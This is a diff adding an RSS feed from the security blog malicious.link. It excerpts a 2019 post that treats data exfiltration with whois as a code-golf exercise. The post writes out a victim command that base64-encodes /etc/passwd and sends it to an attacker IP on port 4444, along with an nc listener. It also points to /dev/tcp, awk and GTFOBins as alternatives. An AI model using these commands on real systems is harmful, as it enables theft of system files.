@@ -1,0 +1,52 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Xargs on malicious.link</title>
+    <link>/tags/xargs/</link>
+    <description>Recent content in Xargs on malicious.link</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <lastBuildDate>Wed, 06 Mar 2019 09:30:44 -0500</lastBuildDate>
+    
+        <atom:link href="/tags/xargs/index.xml" rel="self" type="application/rss+xml" />
+    
+    
+    <item>
+      <title>Bash Golf with Whois</title>
+      <link>/post/2019/bash-golf-with-whois/</link>
+      <pubDate>Wed, 06 Mar 2019 09:30:44 -0500</pubDate>
+      
+      <guid>/post/2019/bash-golf-with-whois/</guid>
+      <description>&lt;p&gt;If you have never played Code Golf before, the essential idea is that you take a programming goal, such as &amp;ldquo;&lt;a href=&#34;https://code-golf.io/prime-numbers&#34;&gt;Print all prime numbers from 1 to 100&lt;/a&gt;&amp;rdquo;, and then try to do so in the most effient / least amount of lines possible.&lt;/p&gt;
+
+&lt;p&gt;There is a great website where these challenges can be found: &lt;a href=&#34;https://code-golf.io/&#34;&gt;https://code-golf.io/&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;I enjoy playing code golf, so when I saw the following tweet, I had to try it out:&lt;/p&gt;
+
+
+
+&lt;p&gt;The commands in the image are (just making up an IP since it&amp;rsquo;s blacked out):&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Victim&lt;/strong&gt;:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;whois -h 10.110.10.81 -p 4444 `cat /etc/passwd | base64`
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;strong&gt;Attacker&lt;/strong&gt;:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;nc -l -p 4444
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Now, a lot of responders mentioned that you could just use the &lt;code&gt;/dev/tcp&lt;/code&gt; method or &lt;code&gt;awk&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;blockquote class=&#34;twitter-tweet&#34; data-conversation=&#34;none&#34; data-lang=&#34;en&#34;&gt;&lt;p lang=&#34;en&#34; dir=&#34;ltr&#34;&gt;Why whois?&lt;br&gt;&lt;br&gt;TCP&lt;a href=&#34;https://t.co/6UstTUeJ4M&#34;&gt;https://t.co/6UstTUeJ4M&lt;/a&gt;&lt;br&gt;&lt;br&gt;awk&lt;a href=&#34;https://t.co/QlCoAXFvKh&#34;&gt;https://t.co/QlCoAXFvKh&lt;/a&gt;&lt;br&gt;&lt;br&gt;Much easier and faster!&lt;/p&gt;&amp;mdash; Malwrologist (@DissectMalware) &lt;a href=&#34;https://twitter.com/DissectMalware/status/1102781062911066112?ref_src=twsrc%5Etfw&#34;&gt;March 5, 2019&lt;/a&gt;&lt;/blockquote&gt;
+&lt;script async src=&#34;https://platform.twitter.com/widgets.js&#34; charset=&#34;utf-8&#34;&gt;&lt;/script&gt;&lt;/p&gt;
+
+&lt;p&gt;While this is awesome and true, and for practicality probably should be used instead of &lt;code&gt;whois&lt;/code&gt; it&amp;rsquo;s more about the mental stretch and exercise for me. You never know there just might a situation where you can&amp;rsquo;t use either of those and &lt;code&gt;whois&lt;/code&gt; is still there.&lt;/p&gt;
+
+&lt;p&gt;For those looking for a lot more file uploads or other such exploitation techniques, check out &lt;a href=&#34;https://gtfobins.github.io/&#34;&gt;GTFOBins&lt;/a&gt; and in particular &lt;a href=&#34;https://gtfobins.github.io/#+file%20upload&#34;&gt;https://gtfobins.github.io/#+file%20upload&lt;/a&gt;. &lt;code&gt;whois&lt;/code&gt; is detailed here: &lt;a href=&#34;https://gtfobins.github.io/gtfobins/whois/&#34;&gt;https://gtfobins.github.io/gtfobins/whois/&lt;/a&gt;&lt;/p&gt;
+</description>
+    </item>
+    
+  </channel>
+</rss>
